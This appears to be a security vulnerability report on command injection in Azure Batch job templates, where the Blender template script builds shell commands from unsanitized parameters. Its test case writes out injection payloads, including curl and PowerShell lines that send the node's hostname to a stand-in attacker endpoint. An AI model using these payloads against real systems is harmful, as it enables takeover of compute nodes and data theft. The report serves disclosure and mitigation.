## Combined Vulnerability Report

### 1. Command Injection in Job Templates via Unsanitized Parameters

*   **Description:**
    An attacker can inject arbitrary commands into Azure Batch compute nodes by crafting malicious job templates. These templates define tasks, often with parameters that are incorporated into the command line executed by the Batch service. When these parameters are not properly sanitized, an attacker can inject shell commands within the parameter values. When a user unknowingly uses a compromised template, the injected commands will be executed on the Azure Batch compute nodes during task execution. This vulnerability arises from the direct and unsafe embedding of user-controlled template parameters into task command lines within job templates, without adequate input validation or sanitization. Attackers can manipulate parameters like `optionalParams`, `blendFile`, or even directly craft malicious task definitions within the JSON template to achieve command injection.

    **Step-by-step trigger:**
    1.  An attacker crafts a malicious JSON job template (`job.template.json`).
    2.  This template defines parameters (e.g., `optionalParameters`, `blendFile`, or any parameter used in command construction) intended to be used in task command lines.
    3.  The attacker injects malicious commands into the `defaultValue` or other configurable parts of these parameters, using shell command separators or injection techniques (e.g., `;`, `&`, `|`, backticks, etc.).
    4.  A user, intending to use Azure Batch templates, imports or utilizes this malicious template through Batch Explorer or Azure Batch CLI extensions.
    5.  When a job is created and tasks are executed based on this template, the system parses the template and constructs task command lines.
    6.  Due to the lack of input sanitization, the injected malicious commands are directly embedded into the task command line.
    7.  The Azure Batch service executes the task on a compute node.
    8.  The operating system shell on the compute node interprets and executes the command line, including the attacker's injected commands.

*   **Impact:**
    Successful command injection leads to arbitrary command execution on Azure Batch compute nodes. This has critical security implications:
    *   **Remote Command Execution:** Attackers gain the ability to execute arbitrary shell commands on the Azure Batch compute nodes.
    *   **System Compromise:** Full control over the compute node is achievable, allowing the attacker to perform any action with the privileges of the Batch task.
    *   **Data Exfiltration:** Attackers can access and exfiltrate sensitive data stored on or accessible from the compute nodes, including data from mounted storage accounts, secrets within the Batch environment, or other connected systems.
    *   **Malware Installation:** Attackers can install malware, backdoors, or other malicious software on the compute nodes.
    *   **Lateral Movement:** Compromised compute nodes can be leveraged to pivot and attack other Azure resources or systems accessible from the Batch environment.
    *   **Resource Hijacking:** Compute resources can be hijacked for malicious purposes, such as cryptomining or participating in botnets.

    The overall impact is considered **critical** due to the potential for complete compromise of compute resources and the associated data and infrastructure risks.

*   **Vulnerability Rank:** Critical

*   **Currently Implemented Mitigations:**
    None.  Review of the provided code and template structure reveals no input sanitization, validation, or secure command construction practices implemented within the project to prevent command injection. The templates are designed to be parameterized, but without any security measures to handle potentially malicious parameter values.

*   **Missing Mitigations:**
    To effectively mitigate this critical vulnerability, the following security measures are essential:
    *   **Input Sanitization:** Implement robust input sanitization for all template parameters that are used in constructing command lines. This should include escaping or removing shell-sensitive characters and sequences. Special attention should be paid to characters like `;`, `&`, `|`, `$`, `` ` ``, `\`, `*`, `?`, `~`, `<`, `>`, `(`, `)`, `{`, `}`, `[`, `]`, `!`, `#`, `^`, `'`, `"`, and whitespace.
    *   **Parameter Validation:** Validate the format and content of user-provided parameters against expected patterns and types. For example, validate file paths, frame ranges, and other parameters to ensure they conform to expected values and do not contain malicious payloads. Use allowlists and restrict input to expected formats where possible.
    *   **Secure Command Construction:**  Employ secure command construction methods that avoid direct shell interpretation of user inputs. Instead of string formatting or concatenation, utilize libraries or methods that allow passing command arguments as a list or array. This approach prevents shell injection vulnerabilities by ensuring that parameters are treated as distinct arguments and not as part of a single command string to be parsed by the shell. Consider using libraries like `subprocess` in Python with argument lists, or equivalent methods in other languages.
    *   **Principle of Least Privilege:** Configure Azure Batch tasks to run with the minimum necessary privileges. This limits the scope of damage an attacker can inflict even if command injection is successful. While not a direct mitigation for command injection, it reduces the potential impact.
    *   **Sandboxing/Isolation:** Consider sandboxing or containerizing the Batch tasks to further isolate them from the underlying compute node and limit the impact of any malicious command execution. Azure Batch provides some level of isolation, but additional layers could be beneficial.
    *   **Security Auditing and Logging:** Implement comprehensive logging and auditing of template usage, parameter values, and task executions. This enables detection of suspicious activities and provides forensic information in case of exploitation. Monitor logs for unusual command executions or errors.
    *   **Template Source Verification:** For public or shared templates, establish mechanisms to verify the source and integrity of templates to reduce the risk of using malicious templates. Digital signatures or template repositories with access controls can be considered.

*   **Preconditions:**
    Specific conditions must be met for this vulnerability to be exploited:
    *   **Malicious Template Availability:** The attacker must be able to create, modify, or distribute a malicious job template (`job.template.json` or similar template files). This could involve:
        *   Compromising a template repository.
        *   Contributing a malicious template to a public gallery or shared location.
        *   Tricking a user into using a locally crafted malicious template.
    *   **User Action:** A user with access to an Azure Batch account must use Batch Explorer, Azure Batch CLI extensions, or any other tool that processes and executes job templates. They must unknowingly select and run a job based on the malicious template.

*   **Source Code Analysis:**
    The vulnerability is located in the way task command lines are constructed using template parameters, specifically in the absence of input sanitization.

    1.  **Vulnerable Code Location:** The primary vulnerable code pattern is found in scripts that construct Blender commands, such as `/code/templates/blender/scripts/python-frame-splitter.py`, specifically within the `blender_command` function. Similar patterns may exist in other template scripts.

        ```python
        def blender_command(blend_file, optionalParams):
            """
            Gets the operating system specific blender exe.
            """
            if os.environ["TEMPLATE_OS"].lower() == "linux":
                command = "blender -b \"{}/{}\" -P \"{}/scripts/python-task-manager.py\" -y -t 0 {}" # Linux
            else:
                command = "\"%BLENDER_2018_EXEC%\" -b \"{}\\{}\" -P \"{}\\scripts\\python-task-manager.py\" -y -t 0 {}" # Windows

            return command.format(
                os_specific_env("AZ_BATCH_JOB_PREP_WORKING_DIR"),
                blend_file,
                os_specific_env("AZ_BATCH_TASK_WORKING_DIR"),
                optionalParams
            )
        ```

        **Visualization:**

        ```
        Template Parameter (e.g., optionalParams from job.template.json)
          |
          V
        Environment Variable (OPTIONAL_PARAMS)  <-- Set based on template parameter
          |
          V
        blender_command Function in python-frame-splitter.py
          |
          V
        Command String Construction (using .format() without sanitization)
          |
          V
        Shell Command Execution on Azure Batch Compute Node --> Command Injection Vulnerability
        ```

    2.  **Analysis:** The `blender_command` function constructs the Blender command by directly embedding the `optionalParams` variable (derived from the `OPTIONAL_PARAMS` environment variable, which in turn originates from a user-controllable template parameter) into the command string using Python's `.format()` method. This string formatting is vulnerable because any shell commands injected within the `optionalParams` value will be interpreted and executed by the shell when the command is run on the compute node. There is no input validation or sanitization applied to `optionalParams` before it is incorporated into the command. The same vulnerability pattern applies to other parameters used in command construction within different templates.

*   **Security Test Case:**
    To validate the command injection vulnerability, perform the following steps:

    1.  **Prepare a Malicious Job Template:** Modify an existing `job.template.json` (e.g., `templates/blender/render-default-linux/job.template.json`) or create a new one. Locate a parameter that is used in the task command line (e.g., "optionalParameters" in Blender templates).
    2.  **Inject Malicious Command Payload:** Set the `defaultValue` of the chosen parameter in the `job.template.json` to a malicious payload designed to execute a simple command on the target operating system of the compute nodes (Linux or Windows).
        *   **Linux Payload Example:**  `; touch /tmp/pwned ;`  (creates a file `/tmp/pwned`) or  `; curl -X POST -d "$(hostname)" <attacker_controlled_endpoint> ;` (exfiltrates hostname to attacker server).
        *   **Windows Payload Example:**  `& echo pwned > C:\pwned.txt &` (creates a file `C:\pwned.txt` with content "pwned") or `& powershell -Command "Invoke-WebRequest -Uri 'http://attacker.example.com/pwned' -Method Post -Body (hostname)" &` (exfiltrates hostname using PowerShell). Replace `<attacker_controlled_endpoint>` or `http://attacker.example.com/pwned` with a URL you control to receive the exfiltrated data if testing data exfiltration.
        Example modification in `job.template.json` for "optionalParameters":
        ```json
        {
           "name": "optionalParameters",
           "type": "string",
           "defaultValue": "; touch /tmp/pwned",
           "metadata": {
             "description": "Optional parameters"
           }
         }
        ```
    3.  **Submit a Job using the Malicious Template:** Use Azure Batch CLI, Batch Explorer, or any tool that utilizes job templates to submit a new job based on the modified `job.template.json`. Select the appropriate template and configure any other necessary job settings. Ensure the job targets a pool where tasks will be executed.
    4.  **Monitor Task Execution:** Monitor the job and task status in Azure Batch. Wait until the task starts running and completes.
    5.  **Verify Command Execution:**
        *   **Method 1: Access Compute Node (If Possible):** If you have access to the compute node (e.g., via SSH/RDP and Batch node agent), connect to the node and check for the execution of your injected command. For example, on Linux, check if the file `/tmp/pwned` was created using `ls /tmp/pwned`. On Windows, check for `C:\pwned.txt`.
        *   **Method 2: Data Exfiltration Verification:** If you used a data exfiltration payload (e.g., `curl` or `Invoke-WebRequest`), monitor your attacker-controlled endpoint for incoming HTTP requests. If you receive a request from the Batch compute node, it confirms command execution and network connectivity from the node.
        *   **Method 3: Task Logs:** Examine the task logs ( `stdout.txt`, `stderr.txt`) in Azure Batch Explorer or via Azure CLI. Look for any output or errors that might indicate the execution of your injected command. Note that direct output from commands like `touch` might not be visible in logs, but errors or side effects might be. For commands like `curl`, you might see connection attempts or error messages in the logs.
    6.  **Confirmation:** If you successfully verify the creation of the file, data exfiltration, or observe other expected side effects of your injected command, the command injection vulnerability is confirmed.